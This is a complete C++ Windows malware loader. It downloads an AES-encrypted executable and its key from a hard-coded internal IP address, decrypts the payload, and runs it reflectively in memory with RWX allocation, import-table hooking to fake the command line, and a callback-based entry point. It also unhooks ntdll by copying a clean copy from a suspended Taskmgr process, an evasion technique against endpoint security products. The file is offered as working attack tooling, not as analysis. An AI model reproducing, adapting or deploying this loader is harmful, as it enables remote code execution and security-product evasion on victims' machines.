#define _CRT_RAND_S
#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <limits>
#include <stdlib.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "winhttp")

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "ntdll")

EXTERN_C NTSTATUS NtOpenSection(
    OUT PHANDLE             SectionHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes
);

using MyNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );




typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;



struct DATA {

    LPVOID data;
    size_t len;

};


void dhanushaes(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);
    

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {

    DATA data;
    std::vector<unsigned char> buffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);


    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, whost,
            port, 0);
    else
        printf("Failed in WinHttpConnect (%u)\n", GetLastError());

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL);
    else
        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    else
        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());

    // Keep checking for data until there is nothing left.
    if (bResults)
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the Data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {

                    buffer.insert(buffer.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);

                }
                delete[] pszOutBuffer;
            }

        } while (dwSize > 0);

        if (buffer.empty() == TRUE)
        {
            printf("failed to get code");
        }

        // Report any errors.
        if (!bResults)
            printf("Error %d has occurred.\n", GetLastError());

        // Close any open handles.
        if (hRequest) WinHttpCloseHandle(hRequest);
        if (hConnect) WinHttpCloseHandle(hConnect);
        if (hSession) WinHttpCloseHandle(hSession);

        size_t size = buffer.size();

        char* bufdata = (char*)malloc(size);
        for (int i = 0; i < buffer.size(); i++) {
            bufdata[i] = buffer[i];
        }
        data.data = bufdata;
        data.len = size;
        return data;

}


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* comdansicool = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** dhanush_poimaArgva = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;


//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
    return comdansicool;
}

char*** __cdecl hook__p___argv(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
    return &dhanush_poimaArgva;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
    *_Argc = int_masqCmd_Argc;
    *_Argv = dhanush_poimaArgva;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    //BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
    return 0;
}

int __cdecl hookexit(int status)
{
    
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    
    ExitThread(0);
}
void masqueradeCmdline()
{
   
    int required_size = MultiByteToWideChar(CP_UTF8, 0, comdansicool, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, comdansicool, -1, sz_masqCmd_Widh, required_size);

    
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    dhanush_poimaArgva = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)dhanush_poimaArgva) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        dhanush_poimaArgva[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}



void freeargvA(char** array, int Argc)
{
    
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}


void dhansuhfreetheargvW(wchar_t** array, int Argc)
{
    
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}


char* dhanushgetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = dhanushgetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);
                

                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else
                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}

void dhanushload(char* data, DWORD datasize)
{

    masqueradeCmdline();

    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

    BYTE* pImageBase = NULL;
    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;
    
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)dhanushgetNTHeaders(data);
    if (!ntHeader) {
        exit(0);
    }
    
    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;


    HMODULE dll = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }

    // FILL the memory block with PEdata
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }

    // Fix the PE Import addr table
    RepairIAT(pImageBase);

    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
    
    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
    
}




LPVOID getNtdll() {

    LPVOID pntdll = NULL;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    CreateProcessA("C:\\Windows\\System32\\Taskmgr.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));


    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        return NULL;
    }


    TerminateProcess(pi.hProcess, 0);
    return pntdll;
}




BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                return FALSE;
            }

            
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                return FALSE;
            }

        }
    }

    return TRUE;

}


int main() {

        

        const char* host = "192.168.130.175";


        DWORD port = 80;


        const char* pe = "cipher.bin";

        const char* key = "key.bin";

        size_t cSize1 = strlen(host) + 1;
        wchar_t* whost = new wchar_t[cSize1];
        mbstowcs(whost, host, cSize1);


        size_t cSize2 = strlen(pe) + 1;
        wchar_t* wpe = new wchar_t[cSize2];
        mbstowcs(wpe, pe, cSize2);

        size_t cSize3 = strlen(key) + 1;
        wchar_t* wkey = new wchar_t[cSize3];
        mbstowcs(wkey, key, cSize3);

        

        
        DATA PE = GetData(whost, port, wpe);
        if (!PE.data) {
            return -1;
        }

        
        DATA keyData = GetData(whost, port, wkey);
        if (!keyData.data) {
            return -2;
        }
       
        
       
        dhanushaes((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
        

        comdansicool = (char*)"coolboy";
        
        
        dhanushload((char*)PE.data, PE.len);



    return 0;
}